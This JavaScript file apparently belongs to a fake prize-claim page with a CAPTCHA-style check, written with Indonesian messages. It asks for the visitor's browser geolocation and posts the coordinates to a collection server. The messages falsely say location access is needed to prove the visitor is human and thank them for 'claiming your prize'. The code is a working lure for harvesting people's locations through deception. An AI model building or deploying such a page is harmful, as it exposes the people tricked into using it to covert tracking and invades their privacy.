function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError);
    } else {
        showNotification("Geolocation is not supported by this browser.");
    }
}

function sendPosition(position) {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    var customMessage = "Terima kasih telah mengklaim hadiah Anda!";  // Pesan kustom

    fetch('http://localhost:5000/location', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            latitude: latitude,
            longitude: longitude,
            custom_message: customMessage
        }),
    })
    .then(response => response.json())
    .then(data => {
        showNotification(data.message);
    })
    .catch((error) => {
        console.error('Error:', error);
        showNotification("Error!! Aktifkan Akses Lokasi Anda, guna Memastikan Anda Manusia!");
    });
}

function showError(error) {
    let message = "";
    switch(error.code) {
        case error.PERMISSION_DENIED:
            message = "Aktifkan Akses Lokasi Anda, guna Memastikan Anda Manusia!";
            break;
        case error.POSITION_UNAVAILABLE:
            message = "Akses Lokasi Belum Disetujui!";
            break;
        case error.TIMEOUT:
            message = "The request to get user location timed out.";
            break;
        case error.UNKNOWN_ERROR:
            message = "An unknown error occurred.";
            break;
    }
    showNotification(message);
}

function showNotification(message) {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.classList.add('show');
    setTimeout(() => {
        notification.classList.remove('show');
    }, 5000); // Menyembunyikan notifikasi setelah 5 detik
}

function checkCheckboxes() {
    const citizen = document.getElementById('citizen').checked;
    const robot = document.getElementById('robot').checked;
    const terms = document.getElementById('terms').checked;
    const submitBtn = document.getElementById('submitBtn');

    if (citizen && robot && terms) {
        submitBtn.disabled = false;
    } else {
        submitBtn.disabled = true;
    }
}
